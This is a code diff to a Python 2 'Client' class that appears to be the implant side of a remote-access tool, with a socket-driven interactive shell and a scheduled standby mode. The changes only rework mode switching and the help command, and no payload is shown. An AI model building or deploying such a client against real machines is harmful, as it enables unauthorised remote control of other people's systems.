@@ -89,7 +89,6 @@ class Client(object):
 
     def __init__(self, **kwargs):
         self._setup(**kwargs)
-        self._mode      = 0
         self._exit      = 0
         self._threads   = {}
         self._info      = self._get_info()
@@ -220,7 +219,7 @@ class Client(object):
     def _receive(self):
         try:
             data = ""
-            self.socket.setblocking(False) if self._mode else self.socket.setblocking(True)
+            self.socket.setblocking(False) if self.standby.status else self.socket.setblocking(True)
             while "\n" not in data:
                 try:
                     data += self.socket.recv(1024)
@@ -546,7 +545,7 @@ class Client(object):
 
     def _shell(self):
         while True:
-            if self.shell.status:
+            if not self.shell.status:
                 break
             else:
                 prompt = "[%d @ {}]> ".format(os.getcwd())
@@ -566,15 +565,15 @@ class Client(object):
 
     def _standby(self):
         while True:
-            if self.standby.status:
+            if not self.standby.status:
+                break
+            else:
                 if time.time() > self.standby.options['next_run']:
                     self.run()
                 time.sleep(1)
                 b = self._receive()
                 if b and len(b):
                     self._enable('shell')
-            else:
-                break
         return self.shell()
             
     def _start(self):
@@ -584,10 +583,10 @@ class Client(object):
             while True:
                 if self._exit:
                     break
-                elif self._mode:
-                    self.standby()
-                else:
+                elif self.shell.status:
                     self.shell()
+                elif self.standby.status:
+                    self.standby()
         except Exception as e:
             if self.__v__:
                 print "Error: '{}'".format(str(e))
@@ -1123,7 +1122,7 @@ class Client(object):
         usage:          help [option]
         description:    show command usage information
         """
-        return self._help(args) if len(args) else self._help()
+        return self._help(args)
 
     @_command
     def info(self):
